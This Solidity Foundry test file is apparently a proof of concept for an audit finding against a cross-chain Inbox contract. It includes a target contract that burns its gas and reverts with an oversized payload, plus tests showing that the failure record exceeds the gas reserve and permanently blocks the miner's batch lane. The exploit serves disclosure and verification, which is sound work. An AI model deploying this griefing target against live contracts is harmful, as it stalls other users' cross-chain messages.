// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Inbox} from "../../contracts/Inbox.sol";
import {FeeManager} from "../../contracts/fee/FeeManager.sol";
import {FeeManagerStubBase} from "../../contracts/fee/FeeManagerStubBase.sol";
import {MpcAbiReEncode} from "../../contracts/MpcAbiReEncode.sol";
import {PriceOracle} from "../../contracts/fee/PriceOracle.sol";
import "@coti-io/coti-contracts/contracts/pod/IInbox.sol";
import "@coti-io/coti-contracts/contracts/pod/IInboxMiner.sol";

/// Target that burns its entire stipend, then reverts with a payload of a chosen size.
/// The burn is identical across sizes, so the ONLY variable between runs is the number of
/// bytes the Inbox must persist in errors[rid] — the gas-isolation the Hardhat PoC lacked.
contract BurnRevertTarget {
    uint256 public revertSize;
    uint256 public keepGas = 6000;

    function configure(uint256 size) external { revertSize = size; }

    fallback() external {
        uint256 keep = keepGas;
        assembly { for {} gt(gas(), keep) {} {} }
        uint256 n = revertSize;
        assembly {
            let p := mload(0x40)
            // deterministic non-zero payload bytes
            for { let i := 0 } lt(i, n) { i := add(i, 32) } { mstore(add(p, i), not(0)) }
            revert(p, n)
        }
    }
}

/// Measures the raw cost of the exact errors[rid] record the Inbox writes on failure.
contract ErrorRecordCost {
    struct Err { bytes32 requestId; uint64 errorCode; bytes errorMessage; }
    mapping(bytes32 => Err) public errors;

    function write(bytes32 rid, bytes memory payload) external returns (uint256 used) {
        uint256 before = gasleft();
        errors[rid] = Err({requestId: rid, errorCode: 1, errorMessage: payload});
        used = before - gasleft();
    }
}

contract GasReservePoC is Test {
    uint256 constant SRC = 1000;
    uint256 constant DST = 1001;
    uint256 constant GP = 1 gwei;
    /// InboxMiner.sol:20
    uint256 constant POST_CALL_GAS_RESERVE = 200_000;

    address owner = address(this);
    address user = makeAddr("user");
    Inbox source;
    Inbox target;
    BurnRevertTarget victimTarget;

    function _fee() internal pure returns (FeeManagerStubBase.FeeConfig memory f) {
        f = FeeManagerStubBase.FeeConfig({constantFee: 0, gasPerByte: 800, callbackExecutionGas: 100_000,
            errorLength: 256, bufferRatioX10000: 5000, maxMethodCallBytes: 8192, maxExecutionGas: 5_000_000,
            gasPriceMul: 1, gasPriceDiv: 1});
    }

    function _mk(uint256 id, PriceOracle o) internal returns (Inbox c) {
        c = new Inbox();
        c.init(owner, id, address(new MpcAbiReEncode()), address(new FeeManager()));
        c.updateMinFeeConfigs(_fee(), _fee());
        c.addMiner(owner);
        c.setPriceOracle(address(o));
        c.setGasPriceBounds(0, GP, GP);
    }

    function setUp() public {
        PriceOracle o = new PriceOracle(owner);
        o.setInboxTokens(address(0x1111), address(0xC071));
        o.setLocalTokenPriceUSD(1e18);
        o.setRemoteTokenPriceUSD(1e18);
        source = _mk(SRC, o);
        target = _mk(DST, o);
        victimTarget = new BurnRevertTarget();
        vm.deal(user, 1000 ether);
        vm.txGasPrice(GP);
    }

    function _mc() internal pure returns (IInbox.MpcMethodCall memory m) {
        m = IInbox.MpcMethodCall({selector: bytes4(0), data: "", datatypes: new bytes8[](0), datalens: new bytes32[](0)});
    }

    /// Queue one message on SRC aimed at the burn target, return the mined item.
    function _queue() internal returns (IInboxMiner.MinedRequest memory m) {
        vm.prank(user, user);
        source.sendOneWayMessage{value: 4_500_000 * GP}(DST, address(victimTarget), _mc(), bytes4(0));
        uint256 len = source.getRequestsLen(DST);
        IInbox.Request memory r = source.getRequests(DST, len - 1, 1)[0];
        m = IInboxMiner.MinedRequest({requestId: r.requestId, sourceContract: r.originalSender,
            targetContract: r.targetContract, methodCall: r.methodCall, callbackSelector: r.callbackSelector,
            errorSelector: r.errorSelector, isTwoWay: r.isTwoWay, sourceRequestId: r.sourceRequestId,
            targetFee: r.targetFee, callerFee: r.callerFee});
    }

    function _mine(IInboxMiner.MinedRequest memory m, uint256 gasLimit) internal returns (bool ok, uint256 code) {
        IInboxMiner.MinedRequest[] memory batch = new IInboxMiner.MinedRequest[](1);
        batch[0] = m;
        bytes memory cd = abi.encodeCall(IInboxMiner.batchProcessRequests, (SRC, batch));
        (ok,) = address(target).call{gas: gasLimit}(cd);
        if (ok) { (, uint64 c,) = target.errors(m.requestId); code = c; }
    }

    /// STEP 1 — the arithmetic in the finding: what does the failure record actually cost?
    function test_1_error_record_write_cost() public {
        ErrorRecordCost h = new ErrorRecordCost();
        uint256 small = h.write(bytes32(uint256(1)), _bytes(4));
        uint256 big = h.write(bytes32(uint256(2)), _bytes(256));
        console2.log("errors[rid] write, 4-byte payload  :", small);
        console2.log("errors[rid] write, 256-byte payload:", big);
        console2.log("POST_CALL_GAS_RESERVE              :", POST_CALL_GAS_RESERVE);
        assertGt(big, POST_CALL_GAS_RESERVE, "256-byte failure record alone exceeds the reserve");
    }

    /// STEP 2 — gas isolation: identical burn, only the payload size differs.
    function test_2_isolated_payload_size_flips_the_batch() public {
        uint256 GAS_LIMIT = 3_000_000;

        victimTarget.configure(4);
        IInboxMiner.MinedRequest memory m1 = _queue();
        (bool okSmall, uint256 codeSmall) = _mine(m1, GAS_LIMIT);
        console2.log("4-byte revert  : batch ok =", okSmall, ", errorCode =", codeSmall);

        victimTarget.configure(256);
        IInboxMiner.MinedRequest memory m2 = _queue();
        (bool okBig,) = _mine(m2, GAS_LIMIT);
        console2.log("256-byte revert: batch ok =", okBig);

        assertTrue(okSmall, "small payload must be recorded");
        assertEq(codeSmall, 1, "small payload recorded as execution failure");
        assertFalse(okBig, "256-byte payload must abort the batch");
    }

    /// STEP 3 — the lane is stuck: the same item fails on every retry of the batch.
    function test_3_batch_cannot_make_progress() public {
        victimTarget.configure(256);
        IInboxMiner.MinedRequest memory m = _queue();
        for (uint256 i = 0; i < 3; ++i) {
            (bool ok,) = _mine(m, 3_000_000);
            console2.log("retry", i, "ok =", ok);
            assertFalse(ok);
        }
        (bytes32 stored,,) = target.errors(m.requestId);
        assertEq(stored, bytes32(0), "nothing was ever recorded, so nonce never advances");
    }

    /// STEP 4 — how much gas the batch actually needs to survive the same item.
    function test_4_threshold_sweep() public {
        victimTarget.configure(256);
        for (uint256 g = 2_600_000; g <= 3_400_000; g += 200_000) {
            IInboxMiner.MinedRequest memory m = _queue();
            (bool ok,) = _mine(m, g);
            console2.log("gas limit", g, "-> ok =", ok);
        }
    }

    function _bytes(uint256 n) internal pure returns (bytes memory b) {
        b = new bytes(n);
        for (uint256 i = 0; i < n; ++i) b[i] = 0xff;
    }
}
